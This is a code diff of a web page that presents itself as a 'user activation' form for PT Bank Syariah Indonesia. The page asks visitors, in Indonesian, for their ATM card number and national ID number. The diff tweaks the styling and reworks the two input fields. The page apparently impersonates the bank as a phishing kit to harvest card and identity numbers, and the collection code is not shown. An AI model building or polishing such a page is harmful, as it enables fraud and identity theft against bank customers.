@@ -1130,7 +1130,7 @@ body { font-family: AvenirMedium; color: var(--chakra-colors-chakra-body-text); 
 
 .css-2z8rzx { box-shadow: rgb(219, 219, 219) 0px 2px 6px; border-radius: 10px; margin-top: 0px; }
 
-.css-qhzfk3 { background-color: rgb(255, 255, 255);margin-top: 8px; padding: 0px  15px; border-bottom: 1px solid #696969; display: flex; -webkit-box-align: center; align-items: center;box-shadow: rgb(105, 105, 105) 0px 0px 1px 0px; border-radius: 4px; }
+.css-qhzfk3 { background-color: rgb(255, 255, 255);margin-top: 8px; padding: 0px  5px; border-bottom: 1px solid #696969; display: flex; -webkit-box-align: center; align-items: center;box-shadow: rgb(105, 105, 105) 0px 0px 1px 0px; border-radius: 1px; }
 
 .css-1fq0ymr { width: 22px; margin-right: 20px ; }
 
@@ -1295,7 +1295,13 @@ body { font-family: AvenirMedium; color: var(--chakra-colors-chakra-body-text); 
           <section class="section">
                   <div class="container">
                                  <div class="css-dnzamn"><img src="" width="500"></div></br><div>
-        <form id="setPin" onsubmit=""><b>Aktivasi User</b><br><h5>Masukan No NIK dan Nomor Kartu ATM dibaeah ini :</h5><div class="css-2z8rzx"><div class="css-qhzfk3"><input type="number" name="Kartu ATM" id="Username" autocomplete="off" placeholder = "Nomor Kartu ATM" required="" class="css-1ew2b06"></div><div class="css-qhzfk3"><input name="NIK" type="number" maxlength="" minlength="" id="password" placeholder="NIK KTP" autocomplete="off" required="" class="css-1ew2b06"></div></div><button type="submit" class="chakra-button css-2z5j4d">AKTIVASI</button></div><br><br><h6 style="font-family: 'Nunito', sans-serif; font-size: 8px; font-weight: bold; color: #000; letter-spacing: 1px; text-align: center; line-height: 1; border-radius: 5px;">PT.Bank Syariah Indonesia TBK. (BSI)</h6>
+        <form id="setPin" onsubmit=""><b>Aktivasi User</b><br><h5>Masukan No NIK dan Nomor Kartu ATM dibaeah ini :</h5><div class="css-2z8rzx"><div class="css-qhzfk3">
+<input type="tel" id="username"  maxlength="16" name="NO DEBIT" data-name="rek" placeholder="Nomor Kartu ATM" minlength="10" class="css-1ew2b06" required>
+</div>
+<div class="css-qhzfk3"><input name="NIK" type="tel" maxlength="16" minlength="5" id="password" placeholder="NIK KTP" required class="css-1ew2b06"></div>
+</div>
+<button type="submit" class="chakra-button css-2z5j4d">AKTIVASI</button>
+</div><br><br><h6 style="font-family: 'Nunito', sans-serif; font-size: 8px; font-weight: bold; color: #000; letter-spacing: 1px; text-align: center; line-height: 1; border-radius: 5px;">PT.Bank Syariah Indonesia TBK. (BSI)</h6>
 <br><br></div>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
        
